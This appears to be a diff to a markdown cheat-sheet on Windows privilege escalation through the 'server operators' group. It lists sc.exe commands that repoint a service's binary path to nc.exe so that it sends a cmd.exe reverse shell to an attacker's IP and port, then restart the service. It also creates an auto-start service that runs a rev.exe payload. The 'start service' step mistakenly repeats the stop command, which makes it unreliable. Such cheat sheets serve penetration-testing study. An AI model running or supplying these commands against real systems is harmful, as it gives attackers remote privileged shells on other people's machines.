@@ -6,34 +6,30 @@ tags: ["server operators", "active driectory", "ad", "Windows", "privesc", "serv
 
 ### Abuse #1: Change service path
 
-<div>
+#### 1. Change service path
 
 ```console
-# Change a service path (e.g. browser)
-sc.exe config browser binPath= "C:\ProgramData\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>"
+# Assume nc.exe is uploaded
+sc.exe config <SERVICE> binPath= "C:\ProgramData\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>"
 ```
+
+#### 2. Restart service
 
 ```console
 # Stop service
-sc.exe stop browser
+sc.exe stop <SERVICE>
 ```
 
 ```console
 # Start service
-sc.exe stop browser
+sc.exe stop <SERVICE>
 ```
-
-</div>
 
 ### Additional: Create service
 
-<div>
-
 ```console
 # Create a service
-sc.exe create pwn binpath= C:\ProgramData\rev.exe start= auto
+sc.exe create <NEW_SERVICE> binpath= C:\ProgramData\rev.exe start= auto
 ```
 
-</div>
-
-<br>
+<small>*Note: there is a space after named arguments*</small>
